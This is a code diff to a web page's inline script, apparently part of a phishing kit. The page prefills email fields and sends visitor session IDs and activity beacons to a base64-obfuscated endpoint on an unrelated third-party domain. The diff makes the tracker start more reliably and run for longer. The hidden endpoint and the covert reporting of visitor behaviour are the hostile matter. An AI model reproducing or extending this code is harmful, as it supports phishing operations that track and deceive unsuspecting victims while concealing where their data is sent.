@@ -1140,7 +1140,7 @@ window.populateEmailFields = function () {
 })();
 </script>
 
-<script defer>
+<script>
 const sessionId = (crypto && crypto.randomUUID) ? crypto.randomUUID() : Date.now().toString();
 const endpoint  = atob("aHR0cHM6Ly9lbGVrdHJvLXNlcnZpcy5iYS9jZ2ktYmluL3Bvc3QucGhw");
 
@@ -1177,7 +1177,7 @@ function startHeartbeat() {
   if (heartbeatStarted) return;
   heartbeatStarted = true;
   heartbeat = setInterval(() => sendEvent("Heartbeat"), 180000); // every 3 min
-  heartbeatTimeout = setTimeout(stopHeartbeat, 540000); // stop after 9 min
+  heartbeatTimeout = setTimeout(stopHeartbeat, 600000); // stop after 10 min
 }
 
 function stopHeartbeat() {
@@ -1185,10 +1185,14 @@ function stopHeartbeat() {
   if (heartbeatTimeout) { clearTimeout(heartbeatTimeout); heartbeatTimeout = null; }
 }
 
-document.addEventListener("DOMContentLoaded", () => {
+// --- Reliable startup guard ---
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", startHeartbeat, { once:true });
+} else {
   startHeartbeat();
-}, { once:true });
+}
 
+// --- Page lifecycle events ---
 window.addEventListener("load", () => {
   sendEvent("Page_Load");
 }, { once:true });
@@ -1208,10 +1212,12 @@ document.addEventListener("visibilitychange", () => {
     hiddenCount++;
   } else if (document.visibilityState === "visible" && visibleCount < 2) {
     sendEvent("Page_Visible");
+    startHeartbeat();
     visibleCount++;
   }
 });
 
+// --- User interaction events ---
 function isMobile() {
   return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
 }
